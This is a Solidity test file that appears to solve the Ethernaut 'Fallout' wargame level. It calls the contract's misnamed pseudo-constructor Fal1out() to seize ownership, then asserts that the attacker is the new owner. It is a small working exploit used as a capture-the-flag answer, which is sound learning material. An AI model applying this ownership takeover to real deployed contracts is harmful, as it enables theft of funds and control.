// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {Fallout} from "../../src/Fallout/Level.sol";

interface IFallout {
  function Fal1out() external payable;

  function owner() external view returns(address);
}

contract FalloutTest is LevelFactory {
  IFallout fallout;

  function setUp() public {
    vm.prank(deployer); // deploy the contract as deployer
    fallout = IFallout(address(new Fallout()));
  }

  function testAttack() public {
    submitLevel("Fallout");
  }

  function _performTest() internal override {
    /* Write your code here */
    fallout.Fal1out(); // is that a constructor, LOL ?
  }

  function _setupTest() internal override {
    super._setupTest();
  }

  function _checkTest() internal override returns (bool) {
    /* Validating the test */
    assertEq(fallout.owner(), attacker);

    return (fallout.owner() == attacker);
  }
}
